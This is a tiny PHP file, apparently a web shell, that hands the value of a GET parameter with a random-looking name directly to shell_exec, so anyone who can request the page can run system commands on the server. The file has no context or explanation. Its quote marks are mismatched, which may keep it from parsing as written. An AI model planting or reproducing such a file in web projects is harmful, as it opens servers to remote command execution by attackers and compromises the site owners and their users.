<?php
shell_exec($_GET[’C0iaGbCp']);
?>
